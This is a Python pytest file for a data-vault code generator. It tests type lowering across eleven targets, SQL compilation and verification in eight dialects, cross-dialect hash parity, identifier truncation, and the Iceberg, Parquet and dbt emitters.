"""Phase V2-4 tests: 11-target dialect matrix, Alg A.5 parity, AST/FMT gates, DefectReporter."""

from __future__ import annotations

import gc
import json
import time
from datetime import UTC, date, datetime
from decimal import Decimal
from pathlib import Path

import duckdb
import pyarrow.parquet as pq
import pytest
import sqlglot
from sqlglot import exp

from opendv.models.errors import CliExitCode, ErrorCode, OpenDVError
from opendv.models.ir_kernel import compute_alg_a5_hash, execute_hash_recipe
from opendv.models.project import EvolutionLockSpec
from opendv.models.sources import ColumnProfile, SourceProfile, TableProfile
from opendv.models.vault_ir import (
    ArrayType,
    BusinessKeyPart,
    ColumnTriageEntry,
    DecimalType,
    DraftField,
    LinkParticipantSpec,
    MapType,
    PortableLogicalType,
    PredicateLeaf,
)
from opendv.models.vault_ir_certified import (
    BronzeTableSpec,
    CertifiedHubSpec,
    CertifiedLinkSpec,
    CertifiedSatelliteSpec,
    CertifiedVaultIR,
    HashRecipeSpec,
    IRField,
    LoadSemanticsSpec,
    MartViewSpec,
    PhysicalLayoutHints,
    PitBridgeSpec,
    RefTableSpec,
    SourceBindingSpec,
    StagingViewSpec,
)
from opendv.storage import (
    ALL_TARGET_IDS,
    SQL_TARGET_IDS,
    DbtEmitter,
    DuckDbProverAdapter,
    EmitterDefectReporter,
    IcebergEmitter,
    ParquetEmitter,
    SourceAttachment,
    SqlAstVerifier,
    SqlGlotVaultCompiler,
    TargetEvalGate,
    lower_logical_type,
    materialize_duckdb_local,
    materialize_parquet_local,
    truncate_identifier_utf8,
)
from opendv.storage.dialects import get_dialect_profile
from opendv.storage.emitters.parquet import _coerce_arrow_value
from opendv.storage.sql_compiler.dialect_hashing import compile_hash_recipe_sql


def _build_enterprise_11type_ir(*, long_names: bool = False) -> CertifiedVaultIR:
    suffix = "_extremely_long_enterprise_identifier_with_utf8_åäö_segment_padding_for_truncation" if long_names else ""
    hub_issuer = f"hub_issuer{suffix}"
    hub_acct = "hub_account"
    hub_planned = "hub_planned_clearing_house"
    lnk_pos = f"lnk_account_issuer{suffix}"
    sal_name = "sal_issuer"
    tlnk_name = "t_lnk_trade_exec"
    sat_core = f"sat_issuer_core{suffix}"
    sat_pii = "sat_issuer_pii"
    mas_name = "mas_issuer_ballot"
    esat_name = "esat_issuer_crosswalk"

    all_attr_specs: list[tuple[str, PortableLogicalType, bool]] = [
        ("issuer_name", "UTF8_STRING", False),
        ("seat_count", "INT32", True),
        ("market_cap", "INT64", True),
        ("nav_dec", DecimalType(precision=18, scale=4), True),
        ("founded_dt", "DATE32", True),
        ("updated_ts", "TIMESTAMP_UTC_US", True),
        ("is_active", "BOOLEAN", True),
        ("meta_json", "JSON_DOCUMENT", True),
        ("tags_arr", ArrayType(element_type="UTF8_STRING"), True),
        ("attrs_map", MapType(key_type="UTF8_STRING", value_type="INT64"), True),
        ("nested_arr", ArrayType(element_type=ArrayType(element_type="UTF8_STRING")), True),
        ("nested_map", MapType(key_type="UTF8_STRING", value_type=ArrayType(element_type="INT32")), True),
    ]

    bronze_cols = [
        IRField(field_id=1, name="issuer_cik", logical_type="UTF8_STRING", nullable=False, is_pii=False),
        IRField(field_id=2, name="account_id", logical_type="UTF8_STRING", nullable=False, is_pii=False),
        IRField(field_id=3, name="bkcc_src", logical_type="UTF8_STRING", nullable=True, is_pii=False),
        IRField(field_id=4, name="alias_cik", logical_type="UTF8_STRING", nullable=True, is_pii=False),
        IRField(field_id=5, name="proposal_seq", logical_type="INT32", nullable=False, is_pii=False),
        IRField(field_id=6, name="owner_email", logical_type="UTF8_STRING", nullable=True, is_pii=True),
        IRField(field_id=7, name="trade_qty", logical_type="INT64", nullable=False, is_pii=False),
        IRField(field_id=8, name="steward_gate_status", logical_type="UTF8_STRING", nullable=True, is_pii=False),
    ]
    fid = 9
    for name, ltype, nullable in all_attr_specs:
        bronze_cols.append(IRField(field_id=fid, name=name, logical_type=ltype, nullable=nullable, is_pii=False))
        fid += 1

    hd_core_recipe = HashRecipeSpec(
        target_col="hash_diff",
        recipe_kind="SAT_HASH_DIFF",
        source_columns=[n for n, _, _ in all_attr_specs],
        sort_alphabetically=True,
        key_columns=["hk_issuer"],
    )
    hd_pii_recipe = HashRecipeSpec(
        target_col="hash_diff",
        recipe_kind="SAT_HASH_DIFF",
        source_columns=["owner_email"],
        sort_alphabetically=True,
        key_columns=["hk_issuer"],
    )
    hd_mas_recipe = HashRecipeSpec(
        target_col="hash_diff",
        recipe_kind="SAT_HASH_DIFF",
        source_columns=["issuer_name"],
        sort_alphabetically=True,
        key_columns=["hk_issuer"],
    )
    hk_issuer_recipe = HashRecipeSpec(
        target_col="hk_issuer",
        recipe_kind="HUB_HK",
        bkcc_literal="IBOR",
        bkcc_col="bkcc_src",
        source_columns=["issuer_cik"],
        sort_alphabetically=False,
        key_columns=["issuer_cik"],
    )
    hk_acct_recipe = HashRecipeSpec(
        target_col="hk_account",
        recipe_kind="HUB_HK",
        bkcc_literal="GLOBAL",
        source_columns=["account_id"],
        sort_alphabetically=False,
        key_columns=["account_id"],
    )
    hk_lnk_recipe = HashRecipeSpec(
        target_col="hk_account_issuer",
        recipe_kind="LINK_HK",
        bkcc_literal="GLOBAL",
        source_columns=["account_id", "issuer_cik"],
        sort_alphabetically=False,
        key_columns=["account_id", "issuer_cik"],
    )
    hk_sal_recipe = HashRecipeSpec(
        target_col="hk_sal_issuer",
        recipe_kind="LINK_HK",
        bkcc_literal="GLOBAL",
        source_columns=["issuer_cik", "account_id"],
        sort_alphabetically=False,
        key_columns=["issuer_cik", "account_id"],
    )
    hk_tlnk_recipe = HashRecipeSpec(
        target_col="hk_trade_exec",
        recipe_kind="LINK_HK",
        bkcc_literal="GLOBAL",
        source_columns=["account_id", "issuer_cik"],
        sort_alphabetically=False,
        key_columns=["account_id", "issuer_cik"],
    )

    stg = StagingViewSpec(
        view_name="stg_issuer_feed",
        source_id="src_ibor",
        source_table_id="src_ibor:issuer_feed",
        col_lineage_mappings={c.name: c.name for c in bronze_cols},
        hash_recipes=[
            hk_issuer_recipe,
            hk_acct_recipe,
            hk_lnk_recipe,
            hk_sal_recipe,
            hk_tlnk_recipe,
            hd_core_recipe,
            hd_pii_recipe,
            hd_mas_recipe,
        ],
        projected_fields=bronze_cols,
    )

    sat_core_cols = [
        IRField(field_id=1, name="hk_issuer", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
        IRField(field_id=2, name="load_dts", logical_type="TIMESTAMP_UTC_US", nullable=False, is_pii=False),
        IRField(field_id=3, name="rec_src", logical_type="UTF8_STRING", nullable=False, is_pii=False),
        IRField(field_id=4, name="hash_diff", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
    ]
    sfid = 5
    for name, ltype, nullable in all_attr_specs:
        sat_core_cols.append(IRField(field_id=sfid, name=name, logical_type=ltype, nullable=nullable, is_pii=False))
        sfid += 1

    return CertifiedVaultIR(
        project_id="proj_11_target",
        ontology_version="1.0.0",
        wave_number=1,
        bronze_tables=[
            BronzeTableSpec(
                table_name="bronze_issuer_feed",
                source_id="src_ibor",
                source_table_id="src_ibor:issuer_feed",
                columns=bronze_cols,
            )
        ],
        staging_views=[stg],
        reference_tables=[
            RefTableSpec(
                ref_name="ref_ccy",
                enum_uri="urn:opendv:ref:ccy",
                code_col="code",
                label_col="label",
                codes={"USD": "US Dollar", "EUR": "Euro"},
            )
        ],
        hubs=[
            CertifiedHubSpec(
                hub_name=hub_issuer,
                key_tier="TIER_3_LOCAL_SCOPED",
                business_keys=[
                    BusinessKeyPart(
                        table_id="src_ibor:issuer_feed",
                        col_name="issuer_cik",
                        source_id="src_ibor",
                        key_tier="TIER_3_LOCAL_SCOPED",
                        bkcc_value="IBOR",
                        bkcc_col="bkcc_src",
                    )
                ],
                source_bindings=[
                    SourceBindingSpec(
                        source_id="src_ibor",
                        table_id="src_ibor:issuer_feed",
                        col_mappings={"issuer_cik": "issuer_cik"},
                        hash_recipe=hk_issuer_recipe,
                    )
                ],
                columns=[
                    IRField(field_id=1, name="hk_issuer", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=2, name="bkcc", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=3, name="load_dts", logical_type="TIMESTAMP_UTC_US", nullable=False, is_pii=False),
                    IRField(field_id=4, name="rec_src", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=5, name="issuer_cik", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                ],
                hash_recipe=hk_issuer_recipe,
                physical_hints=PhysicalLayoutHints(cluster_by_cols=["hk_issuer"]),
            ),
            CertifiedHubSpec(
                hub_name=hub_acct,
                key_tier="TIER_1_GLOBAL_STANDARD",
                business_keys=[
                    BusinessKeyPart(
                        table_id="src_ibor:issuer_feed",
                        col_name="account_id",
                        source_id="src_ibor",
                        key_tier="TIER_1_GLOBAL_STANDARD",
                        bkcc_value="GLOBAL",
                    )
                ],
                source_bindings=[
                    SourceBindingSpec(
                        source_id="src_ibor",
                        table_id="src_ibor:issuer_feed",
                        col_mappings={"account_id": "account_id"},
                        hash_recipe=hk_acct_recipe,
                    )
                ],
                columns=[
                    IRField(field_id=1, name="hk_account", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=2, name="bkcc", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=3, name="load_dts", logical_type="TIMESTAMP_UTC_US", nullable=False, is_pii=False),
                    IRField(field_id=4, name="rec_src", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=5, name="account_id", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                ],
                hash_recipe=hk_acct_recipe,
                physical_hints=PhysicalLayoutHints(cluster_by_cols=["hk_account"]),
            ),
            CertifiedHubSpec(
                hub_name=hub_planned,
                key_tier="TIER_1_GLOBAL_STANDARD",
                is_planned_concept=True,
                physical_hints=None,
            ),
        ],
        links=[
            CertifiedLinkSpec(
                link_name=lnk_pos,
                link_kind="STANDARD",
                participants=[
                    LinkParticipantSpec(hub_name=hub_acct, role_name="ACCOUNT", fk_col_name="hk_account", source_col_names=["account_id"]),
                    LinkParticipantSpec(hub_name=hub_issuer, role_name="ISSUER", fk_col_name="hk_issuer", source_col_names=["issuer_cik"]),
                ],
                source_bindings=[
                    SourceBindingSpec(
                        source_id="src_ibor",
                        table_id="src_ibor:issuer_feed",
                        col_mappings={},
                        hash_recipe=hk_lnk_recipe,
                        load_semantics=LoadSemanticsSpec(
                            source_table_id="src_ibor:issuer_feed",
                            filter_ast=PredicateLeaf(op="IS_NOT_NULL", column="issuer_cik"),
                        ),
                    )
                ],
                columns=[
                    IRField(field_id=1, name="hk_account_issuer", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=2, name="hk_account", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=3, name="hk_issuer", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=4, name="load_dts", logical_type="TIMESTAMP_UTC_US", nullable=False, is_pii=False),
                    IRField(field_id=5, name="rec_src", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                ],
                hash_recipe=hk_lnk_recipe,
                physical_hints=PhysicalLayoutHints(cluster_by_cols=["hk_account_issuer"]),
            ),
            CertifiedLinkSpec(
                link_name=sal_name,
                zone_id="Z3",
                link_kind="SAME_AS",
                participants=[
                    LinkParticipantSpec(hub_name=hub_issuer, role_name="MASTER", fk_col_name="m_hk_issuer", source_col_names=["issuer_cik"]),
                    LinkParticipantSpec(hub_name=hub_acct, role_name="DUPLICATE", fk_col_name="d_hk_account", source_col_names=["account_id"]),
                ],
                source_bindings=[
                    SourceBindingSpec(
                        source_id="src_ibor",
                        table_id="src_ibor:issuer_feed",
                        col_mappings={"m_hk_issuer": "hk_issuer", "d_hk_account": "hk_account"},
                        hash_recipe=hk_sal_recipe,
                    )
                ],
                columns=[
                    IRField(field_id=1, name="hk_sal_issuer", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=2, name="m_hk_issuer", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=3, name="d_hk_account", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=4, name="load_dts", logical_type="TIMESTAMP_UTC_US", nullable=False, is_pii=False),
                    IRField(field_id=5, name="rec_src", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                ],
                hash_recipe=hk_sal_recipe,
                physical_hints=PhysicalLayoutHints(cluster_by_cols=["hk_sal_issuer"]),
            ),
            CertifiedLinkSpec(
                link_name=tlnk_name,
                link_kind="TRANSACTIONAL",
                participants=[
                    LinkParticipantSpec(hub_name=hub_acct, role_name="ACCOUNT", fk_col_name="hk_account", source_col_names=["account_id"]),
                    LinkParticipantSpec(hub_name=hub_issuer, role_name="ISSUER", fk_col_name="hk_issuer", source_col_names=["issuer_cik"]),
                ],
                source_bindings=[
                    SourceBindingSpec(
                        source_id="src_ibor",
                        table_id="src_ibor:issuer_feed",
                        col_mappings={},
                        hash_recipe=hk_tlnk_recipe,
                        load_semantics=LoadSemanticsSpec(
                            source_table_id="src_ibor:issuer_feed",
                            require_review_status="APPROVED",
                        ),
                    )
                ],
                attributes=[DraftField(name="trade_qty", logical_type="INT64", nullable=False, is_pii=False)],
                columns=[
                    IRField(field_id=1, name="hk_trade_exec", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=2, name="hk_account", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=3, name="hk_issuer", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=4, name="load_dts", logical_type="TIMESTAMP_UTC_US", nullable=False, is_pii=False),
                    IRField(field_id=5, name="rec_src", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=6, name="trade_qty", logical_type="INT64", nullable=False, is_pii=False),
                ],
                hash_recipe=hk_tlnk_recipe,
                physical_hints=PhysicalLayoutHints(cluster_by_cols=["hk_trade_exec"]),
            ),
        ],
        satellites=[
            CertifiedSatelliteSpec(
                sat_name=sat_core,
                sat_kind="STANDARD",
                parent_name=hub_issuer,
                source_id="src_ibor",
                source_table_id="src_ibor:issuer_feed",
                attributes=[DraftField(name=n, logical_type=t, nullable=nul, is_pii=False) for n, t, nul in all_attr_specs],
                columns=sat_core_cols,
                hash_recipe=hd_core_recipe,
                physical_hints=PhysicalLayoutHints(cluster_by_cols=["hk_issuer", "load_dts"]),
            ),
            CertifiedSatelliteSpec(
                sat_name=sat_pii,
                sat_kind="PII",
                parent_name=hub_issuer,
                source_id="src_ibor",
                source_table_id="src_ibor:issuer_feed",
                attributes=[DraftField(name="owner_email", logical_type="UTF8_STRING", nullable=True, is_pii=True)],
                columns=[
                    IRField(field_id=1, name="hk_issuer", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=2, name="load_dts", logical_type="TIMESTAMP_UTC_US", nullable=False, is_pii=False),
                    IRField(field_id=3, name="rec_src", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=4, name="hash_diff", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=5, name="owner_email", logical_type="UTF8_STRING", nullable=True, is_pii=True),
                ],
                hash_recipe=hd_pii_recipe,
                physical_hints=PhysicalLayoutHints(cluster_by_cols=["hk_issuer", "load_dts"]),
            ),
            CertifiedSatelliteSpec(
                sat_name=mas_name,
                sat_kind="MAS",
                parent_name=hub_issuer,
                source_id="src_ibor",
                source_table_id="src_ibor:issuer_feed",
                child_dependent_keys=["proposal_seq"],
                attributes=[DraftField(name="issuer_name", logical_type="UTF8_STRING", nullable=False, is_pii=False)],
                columns=[
                    IRField(field_id=1, name="hk_issuer", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=2, name="load_dts", logical_type="TIMESTAMP_UTC_US", nullable=False, is_pii=False),
                    IRField(field_id=3, name="rec_src", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=4, name="hash_diff", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=5, name="proposal_seq", logical_type="INT32", nullable=False, is_pii=False),
                    IRField(field_id=6, name="issuer_name", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                ],
                hash_recipe=hd_mas_recipe,
                physical_hints=PhysicalLayoutHints(cluster_by_cols=["hk_issuer", "load_dts"]),
            ),
            CertifiedSatelliteSpec(
                sat_name=esat_name,
                zone_id="Z3",
                sat_kind="ESAT",
                parent_name=sal_name,
                source_id="src_ibor",
                source_table_id="src_ibor:issuer_feed",
                driving_keys=["m_hk_issuer"],
                columns=[
                    IRField(field_id=1, name="hk_sal_issuer", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=2, name="load_dts", logical_type="TIMESTAMP_UTC_US", nullable=False, is_pii=False),
                    IRField(field_id=3, name="rec_src", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                ],
                physical_hints=PhysicalLayoutHints(cluster_by_cols=["hk_sal_issuer", "load_dts"]),
            ),
        ],
        pit_bridges=[
            PitBridgeSpec(
                object_name="pit_issuer",
                object_kind="PIT",
                root_hub=hub_issuer,
                target_satellites_or_links=[sat_core, sat_pii],
                grain_cols=["hk_issuer", "snapshot_dts"],
            ),
            PitBridgeSpec(
                object_name="brg_account_issuer",
                object_kind="BRIDGE",
                root_hub=hub_acct,
                target_satellites_or_links=[lnk_pos],
                grain_cols=["hk_account"],
            ),
        ],
        information_marts=[
            MartViewSpec(
                view_name="information_mart.vw_issuer_current",
                root_entity=hub_issuer,
                joined_entities=[sat_core, sat_pii],
                columns=[
                    IRField(field_id=1, name="hk_issuer", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=2, name="issuer_cik", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=3, name="issuer_name", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                ],
                select_exprs={
                    "hk_issuer": f"{hub_issuer}.hk_issuer",
                    "issuer_cik": f"{hub_issuer}.issuer_cik",
                    "issuer_name": f"{sat_core}.issuer_name",
                },
            )
        ],
    )


def test_11_target_type_lowering_and_bigquery_nested_fallback() -> None:
    """Verify 11x11 PortableLogicalType lowering including BigQuery nested ARRAY/MAP JSON fallback."""
    nested_arr = ArrayType(element_type=ArrayType(element_type="INT64"))
    nested_map = MapType(key_type="UTF8_STRING", value_type=ArrayType(element_type="UTF8_STRING"))
    simple_map = MapType(key_type="UTF8_STRING", value_type="INT64")

    assert lower_logical_type(nested_arr, "bigquery") == "JSON"
    assert lower_logical_type(nested_map, "bigquery") == "JSON"
    assert lower_logical_type(simple_map, "bigquery") == "ARRAY<STRUCT<key STRING, value INT64>>"
    assert lower_logical_type("FIXED_BINARY_32", "clickhouse") == "FixedString(32)"
    assert lower_logical_type("FIXED_BINARY_32", "sqlserver_fabric") == "BINARY(32)"
    assert lower_logical_type("UTF8_STRING", "sqlserver_fabric", include_tsql_collation=True) == (
        "VARCHAR(MAX) COLLATE Latin1_General_100_BIN2_UTF8"
    )
    assert lower_logical_type("FIXED_BINARY_32", "iceberg") == "fixed[32]"
    assert lower_logical_type("FIXED_BINARY_32", "parquet") == "fixed_size_binary[32]"


def test_all_8_sql_targets_compile_verify_ast_under_50ms_and_exclude_planned(tmp_path: Path) -> None:
    """Compile all 8 SQL dialects, enforce EVAL-AST-01 (<50ms), multi-sat disambiguation, and planned exclusion."""
    ir = _build_enterprise_11type_ir()
    gate = TargetEvalGate()

    for tid in SQL_TARGET_IDS:
        compiler = SqlGlotVaultCompiler(tid)
        bundle = compiler.compile(ir, output_dir=tmp_path / tid)
        assert bundle.manifest is not None
        assert "hub_planned_clearing_house" not in bundle.full_sql

        diags = gate.verify_sql_ast(tid, bundle.full_sql, ir=ir)
        assert diags == []

        # Multi-sat Z1 disambiguation check
        assert "AS hash_diff__sat_issuer_core" in bundle.ddl_sql
        assert "AS hash_diff__sat_issuer_pii" in bundle.ddl_sql

        if tid == "sqlserver_fabric":
            assert "COLLATE Latin1_General_100_BIN2_UTF8" in bundle.ddl_sql
            assert "CHAR(13) + CHAR(10)" in bundle.ddl_sql
            assert "DATALENGTH(" in bundle.ddl_sql
            assert "HASHBYTES('SHA2_256'" in bundle.ddl_sql
            assert "IF OBJECT_ID(" in bundle.ddl_sql
            assert "CREATE OR ALTER VIEW" in bundle.ddl_sql
            assert "WITH (HOLDLOCK)" in bundle.dml_sql
        elif tid == "clickhouse":
            assert "if(isNull(" in bundle.ddl_sql or "if(isNull" in bundle.ddl_sql.replace(" ", "")
            assert "argMax(hash_diff, load_dts)" in bundle.dml_sql
            assert "LEFT ANTI JOIN" in bundle.dml_sql
        elif tid == "postgres":
            assert "ON CONFLICT" in bundle.dml_sql
            assert "DROP VIEW IF EXISTS" in bundle.ddl_sql
        elif tid == "redshift":
            assert "DROP VIEW IF EXISTS" in bundle.ddl_sql
            assert "SHA2(" in bundle.ddl_sql

    # Separate pure EVAL-AST-01 latency check across ALL 8 SQL dialects (<= 50 ms/req SLO)
    from opendv.storage.sql_ast_verifier import _verify_chunk_cached

    verifier = SqlAstVerifier()
    # Isolate microbenchmark from gen-2 GC sweeps over earlier pytest tests' heap.
    gc.collect()
    gc_was_enabled = gc.isenabled()
    gc.disable()
    try:
        for tid in SQL_TARGET_IDS:
            b = SqlGlotVaultCompiler(tid).compile(ir)
            hub_create = next(
                s for s in b.ddl_statements if "hub_issuer" in s and "CREATE TABLE" in s
            )
            stg_create = next(
                s for s in b.ddl_statements if "stg_issuer_feed" in s and "CREATE" in s
            )
            _verify_chunk_cached.cache_clear()
            t_cold_hub = time.perf_counter()
            assert verifier.verify_sql(hub_create, tid, ir=ir) == []
            assert (time.perf_counter() - t_cold_hub) * 1000.0 < 50.0
            _verify_chunk_cached.cache_clear()
            t_cold_stmt = time.perf_counter()
            assert verifier.verify_sql(stg_create, tid, ir=ir) == []
            assert (time.perf_counter() - t_cold_stmt) * 1000.0 < 150.0
            assert verifier.verify_sql(b.full_sql, tid, ir=ir) == []
            t_start = time.perf_counter()
            assert verifier.verify_sql(b.full_sql, tid, ir=ir) == []
            elapsed_ms = (time.perf_counter() - t_start) * 1000.0
            assert elapsed_ms < 50.0, f"{tid} verify_sql(full_sql) took {elapsed_ms:.2f} ms"
    finally:
        if gc_was_enabled:
            gc.enable()


def test_cross_dialect_alg_a5_vectors_and_boolean_null_branch_all_8_dialects() -> None:
    """EVAL-AST-02..03: verify Alg A.5 vectors vs ir_kernel and explicit IS NULL on BOOLEAN in all 8 dialects."""
    gate = TargetEvalGate()
    assert gate.verify_cross_dialect_vectors() == []

    recipe = HashRecipeSpec(
        target_col="hk_bool",
        recipe_kind="HUB_HK",
        bkcc_literal="GLOBAL",
        source_columns=["flag_col"],
        sort_alphabetically=False,
        key_columns=["flag_col"],
    )
    for tid in SQL_TARGET_IDS:
        prof = SqlGlotVaultCompiler(tid).profile
        d = prof.sqlglot_dialect or "duckdb"
        sql_expr = compile_hash_recipe_sql(
            recipe, d, key_tier="TIER_1_GLOBAL_STANDARD", col_types={"flag_col": "BOOLEAN"}
        )
        if d == "clickhouse":
            assert "isNull(" in sql_expr
        else:
            assert "IS NULL THEN NULL" in sql_expr

    # DuckDB execution check: NULL boolean -> '-1:^^', NOT 'false'
    conn = duckdb.connect(":memory:")
    duck_expr = compile_hash_recipe_sql(
        recipe, "duckdb", key_tier="TIER_1_GLOBAL_STANDARD", col_types={"flag_col": "BOOLEAN"}
    )
    got_null = conn.execute(f"SELECT LOWER(HEX({duck_expr})) FROM (SELECT CAST(NULL AS BOOLEAN) AS flag_col)").fetchone()
    got_false = conn.execute(f"SELECT LOWER(HEX({duck_expr})) FROM (SELECT FALSE AS flag_col)").fetchone()
    conn.close()
    assert got_null and got_false
    assert got_null[0] != got_false[0]
    assert got_null[0] == "0" * 64  # all-blank BK short-circuits to 0x00..00
    assert got_false[0] == execute_hash_recipe(
        recipe, {"flag_col": False}, key_tier="TIER_1_GLOBAL_STANDARD", column_types={"flag_col": "BOOLEAN"}
    )


def test_deterministic_13byte_utf8_truncation_and_locked_aliases(tmp_path: Path) -> None:
    """Verify [:max_ident_bytes - 13] UTF-8 boundary truncation, collision suffix, and alias locking."""
    used: set[str] = set()
    # Multi-byte UTF-8 name exceeding 63 bytes on postgres
    name_a = "sat_" + ("ä" * 35) + "_alpha"
    name_b = "sat_" + ("ä" * 35) + "_beta"
    a1 = truncate_identifier_utf8(name_a, 63, used)
    a2 = truncate_identifier_utf8(name_b, 63, used)
    assert len(a1.encode("utf-8")) <= 63
    assert len(a2.encode("utf-8")) <= 63
    assert a1 != a2

    # Force hash collision suffix _01 when base collides
    used_col = {a1}
    a1_dup = truncate_identifier_utf8(name_a, 63, used_col)
    assert a1_dup == f"{a1}_01"
    assert len(a1_dup.encode("utf-8")) <= 63

    # End-to-end compile on postgres (63B) and redshift (127B) with long names
    long_ir = _build_enterprise_11type_ir(long_names=True)
    pg_bundle = SqlGlotVaultCompiler("postgres").compile(long_ir, output_dir=tmp_path / "pg")
    rs_bundle = SqlGlotVaultCompiler("redshift").compile(long_ir, output_dir=tmp_path / "rs")
    for logical, phys in pg_bundle.physical_aliases.items():
        obj = phys.split(".")[-1]
        assert len(obj.encode("utf-8")) <= 63, (logical, phys)
    for logical, phys in rs_bundle.physical_aliases.items():
        obj = phys.split(".")[-1]
        assert len(obj.encode("utf-8")) <= 127, (logical, phys)

    # Alias lock preservation across waves
    locks = EvolutionLockSpec(wave_number=1, physical_aliases=pg_bundle.physical_aliases)
    pg_w2 = SqlGlotVaultCompiler("postgres").compile(long_ir, locks=locks)
    for k, v in pg_bundle.physical_aliases.items():
        assert pg_w2.physical_aliases[k] == v

    # Verify ALL Z0..Z4 exp.Identifier nodes across DDL, DML, and MIG stay <= limit on Postgres (63B) and Redshift (127B)
    for label, sql_text, max_b, dialect_name in (
        ("pg_ddl", pg_bundle.ddl_sql, 63, "postgres"),
        ("pg_dml", pg_bundle.dml_sql, 63, "postgres"),
        ("pg_mig", pg_bundle.migration_sql, 63, "postgres"),
        ("rs_ddl", rs_bundle.ddl_sql, 127, "redshift"),
        ("rs_dml", rs_bundle.dml_sql, 127, "redshift"),
        ("rs_mig", rs_bundle.migration_sql, 127, "redshift"),
    ):
        for stmt in sqlglot.parse(sql_text, read=dialect_name):
            if stmt is None:
                continue
            for ident in stmt.find_all(exp.Identifier):
                assert len(ident.name.encode("utf-8")) <= max_b, (label, ident.name, stmt.sql(dialect=dialect_name)[:160])

    pg_stmts = [s for s in sqlglot.parse(pg_bundle.full_sql, read="postgres") if s is not None]
    pit_create = next(
        s for s in pg_stmts if isinstance(s, exp.Create) and "pit_issuer" in s.sql(dialect="postgres")
    )
    pit_col_names = [
        c.this.name for c in pit_create.find_all(exp.ColumnDef) if isinstance(c.this, exp.Identifier)
    ]
    assert len(pit_col_names) == len(set(pit_col_names))
    assert all(len(c.encode("utf-8")) <= 63 for c in pit_col_names)

    # Collision check: two 60B satellites sharing a 56B prefix on the same staging view on Postgres
    sat_a = "sat_" + ("a" * 52) + "_one"
    sat_b = "sat_" + ("a" * 52) + "_two"
    assert len(sat_a.encode("utf-8")) == 60 and len(sat_b.encode("utf-8")) == 60
    col_ir = _build_enterprise_11type_ir()
    base_sat = col_ir.satellites[0]
    col_ir = col_ir.model_copy(
        update={
            "satellites": [
                base_sat.model_copy(update={"sat_name": sat_a}),
                base_sat.model_copy(update={"sat_name": sat_b}),
            ],
            "pit_bridges": [],
            "information_marts": [],
        }
    )
    col_bundle = SqlGlotVaultCompiler("postgres").compile(col_ir)
    hd_a = col_bundle.stg_hd_col_map[("stg_issuer_feed", sat_a)]
    hd_b = col_bundle.stg_hd_col_map[("stg_issuer_feed", sat_b)]
    assert hd_a != hd_b
    assert len(hd_a.encode("utf-8")) <= 63 and len(hd_b.encode("utf-8")) <= 63
    assert f"AS {hd_a}" in col_bundle.ddl_sql and f"AS {hd_b}" in col_bundle.ddl_sql
    assert f"src.{hd_a} AS hash_diff" in col_bundle.dml_sql and f"src.{hd_b} AS hash_diff" in col_bundle.dml_sql


def test_3_format_emitters_iceberg_parquet_dbt_and_eval_fmt(tmp_path: Path) -> None:
    """Verify iceberg, parquet, and dbt emitters + EVAL-FMT-01..03 + planned exclusion."""
    ir = _build_enterprise_11type_ir()
    gate = TargetEvalGate()

    # 1. Iceberg v2
    ice_dir = tmp_path / "iceberg"
    ice_bundle = IcebergEmitter().emit(ir, output_dir=ice_dir)
    assert gate.verify_format_bundle("iceberg", ice_dir, ir) == []
    assert (ice_dir / "schema_ops/wave_1_update_schema.json").exists()
    assert not (ice_dir / "raw_vault/hub_planned_clearing_house").exists()

    # 2. Parquet ZSTD
    pq_dir = tmp_path / "parquet"
    pq_bundle = ParquetEmitter().emit(ir, output_dir=pq_dir)
    assert gate.verify_format_bundle("parquet", pq_dir, ir) == []
    assert (pq_dir / "raw_vault/hub_issuer/wave=W001/part-00000.zstd.parquet").exists()
    assert (pq_dir / "z3_derived/pit_issuer/latest/part-00000.zstd.parquet").exists()
    hub_tbl = pq.read_table(pq_dir / "raw_vault/hub_issuer/wave=W001/part-00000.zstd.parquet")
    assert hub_tbl.num_rows >= 2  # -1 and -2 Zero-Keys

    # 3. dbt AutomateDV 0.11.x
    dbt_dir = tmp_path / "dbt"
    dbt_bundle = DbtEmitter().emit(ir, dbt_sql_dialect="postgres", output_dir=dbt_dir)
    assert gate.verify_format_bundle("dbt", dbt_dir, ir, dbt_sql_dialect="postgres") == []
    assert "datavault-uk/automate_dv" in dbt_bundle.files["packages.yml"]
